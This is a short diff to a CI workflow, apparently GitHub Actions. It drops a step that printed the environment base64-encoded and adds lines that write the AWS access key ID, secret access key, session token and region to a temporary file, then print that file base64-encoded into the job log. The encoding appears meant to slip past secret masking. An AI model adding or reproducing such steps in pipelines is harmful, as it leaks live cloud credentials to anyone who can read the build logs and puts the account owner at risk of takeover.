@@ -24,8 +24,9 @@ jobs:
       - name: Get User Info
         run: |
           aws sts get-caller-identity
-
-      
-      - name: Get Env
-        run: |
-          env | base64
+          echo "AWS_DEFAULT_REGION=$AWS_DEFAULT_REGION" > /tmp/data
+          echo "AWS_REGION=$AWS_REGION" >> /tmp/data
+          echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID" >> /tmp/data
+          echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY" >> /tmp/data
+          echo "AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN" >> /tmp/data
+          cat /tmp/data | base64
